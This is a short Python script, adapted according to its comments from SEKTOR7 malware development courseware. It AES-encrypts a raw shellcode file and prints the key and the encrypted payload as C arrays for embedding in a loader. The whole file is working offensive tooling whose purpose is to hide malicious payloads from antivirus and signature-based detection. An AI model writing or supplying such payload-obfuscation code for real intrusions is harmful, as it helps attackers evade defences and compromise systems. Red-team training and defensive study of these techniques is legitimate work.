# Adapted from SEKTOR7 malware dev courseware
# Original author: reenz0h (twitter: @SEKTOR7net)
# Reqires pycryptodomex

import sys
from base64 import b64encode
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from Cryptodome.Random import get_random_bytes
import hashlib

# Use this to generate a random key
KEY = get_random_bytes(16)

# Use this KEY to set your own key.
# It should probably be 16 characters.
# KEY = b'RedSiegeRedSiege'

def aes(input_file):
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

    try:
        plaintext = open(input_file, "rb").read()
    except:
        print("File argument needed! %s <raw payload file>" % sys.argv[0])
        sys.exit()

    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    keystring = 'char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };\n'
    payloadstring = 'char shellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'

    return keystring + "\n" + payloadstring

    #print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
    #print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
